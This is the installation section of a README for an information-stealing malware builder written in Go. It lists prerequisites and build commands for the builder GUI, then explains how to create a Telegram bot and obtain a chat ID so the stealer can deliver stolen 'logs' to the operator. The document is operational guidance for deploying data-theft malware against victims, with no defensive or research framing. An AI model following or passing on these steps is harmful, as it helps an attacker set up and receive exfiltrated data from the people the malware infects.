## Installation & Setup
### Pre-requisites:
- [The Go Programming Language](https://go.dev)
- [GCC/MinGW-w64](https://www.mingw-w64.org/)
- For help on installing MinGW-w64, consult [this link](https://code.visualstudio.com/docs/cpp/config-mingw).

### Building
- If you are building from source, you must run the following commands in your terminal.
- ```set CGO=1```
- ```go run main_gui.go```
- This command might take a few minutes as Go has to install packages such as Fyne, which are quite large.
- Once it finishes building, you will be presented with the builder UI and you will be able to proceed.

### Creating a Telegram Bot
- As this stealer uses Telegram for delivery of logs, you are required to create a bot.
- The first thing you must do is message [BotFather](https://t.me/botfather) and create a new bot.
- Once you have the bot created, message [chatIDrobot](https://t.me/chatIDrobot) to receive your chat ID.
- You can then put both of these values in the builder.
- Don't forget to start a conversation with the bot you just created, as you won't be able to receive messages otherwise.
